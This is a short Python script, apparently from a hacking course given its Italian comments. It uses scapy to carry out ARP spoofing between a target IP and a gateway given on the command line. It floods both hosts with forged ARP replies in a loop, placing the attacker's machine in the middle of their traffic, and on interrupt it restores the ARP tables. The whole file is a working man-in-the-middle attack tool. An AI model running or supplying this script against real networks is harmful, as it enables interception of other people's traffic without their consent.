#!/usr/bin/env python

import scapy.all as scapy
import time
import argparse

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    broadcast_arp_request = broadcast/arp_request
    answered_list = scapy.srp(broadcast_arp_request, timeout=1, verbose=False)[0]
    clients_list = []
    #print(answered_list[0])
    return answered_list[0][1].hwsrc

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Target IP")
    parser.add_argument("-g", "--gateway", dest="gateway", help="Gateway IP")
    options = parser.parse_args()# leggo arguments e options
    if not options.target:
        parser.error("[!] Please specify a target, --help for more info")
    return options
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op = 2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

options = get_arguments()
sent_packets_count = 0
try:
    while True:
        spoof(options.target, options.gateway) # dico al v che io sono r
        spoof(options.gateway, options.target) # dico al r che io sono v
        sent_packets_count += 2
        print("\r[+] Packet sent: "+ str(sent_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected CTRL + C.......")
    print("[+] Resetting ARP Tables....Please wait.")
    restore(options.target, options.gateway)
    restore(options.gateway, options.target)
